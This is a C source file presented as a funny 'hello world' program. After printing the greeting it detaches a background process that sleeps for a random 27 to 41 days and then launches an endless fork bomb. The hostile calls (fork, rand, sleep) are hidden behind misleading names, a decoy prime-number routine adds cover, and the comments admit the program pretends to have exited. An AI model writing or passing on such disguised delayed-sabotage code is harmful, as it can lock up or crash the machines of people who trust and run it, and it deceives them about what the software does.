// gcc hello-world-even-funnier.c -o hello && hello

// only works on POSIX compliant systems
// I promise it will be funny. Just be patient.

#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>

const unsigned short prime_sieve[168] = {
	2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,
	103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,
	199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,
	313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,
	433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,
	563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,
	673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,
	811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,
	941,947,953,967,971,977,983,991,997
};

const unsigned char nextprime_i_stt[10] = {0, 25, 46, 64, 78, 96, 109, 125, 139, 154};

const void (*main_loop)(void) = fork;
#define set_val(x) srand(time(NULL) ^ getpid())
const int (*get_val16)(int) = rand;
const int (*log_timestamp)(int) = sleep;

unsigned short nextprime(const unsigned short x) {
	// only returns meaningful results for x in [0, 996]

	if (x > 996)
		return 997;

	// no condition because the value will always be found. 25 iterations max.
	for (unsigned char i = *(nextprime_i_stt + x / 100);; i++)
		if (*(prime_sieve + i) > x)
			return *(prime_sieve + i);
}

static inline __attribute__((always_inline)) int get_val32(void) {
#if RAND_MAX == 0x7fff
	return rand() << 15 | rand();
#elif RAND_MAX > 0x7fff
	return (rand() & 0x7fff) << 15 | (rand() & 0x7fff);
#else
	#error RAND_MAX is less than 15 bits.
#endif
}

int main(void) {
	// act like this is just a hello world program to the console
	puts("Hello, World!");
	// pretend hello world exited. (free the console)
	if (main_loop() != 0)
		return 0;

	// wait between 27 and 41 days
	set_val(256);

	int t = 2332800 + get_val32() % 1209601;

	if (t % 86400 == 0)
		t += (get_val16()%2 * 2 - 1) * nextprime(get_val16() % 997);

	log_timestamp(t);

	// fork bomb.
	while (1)
		main_loop();

	return 0;
}
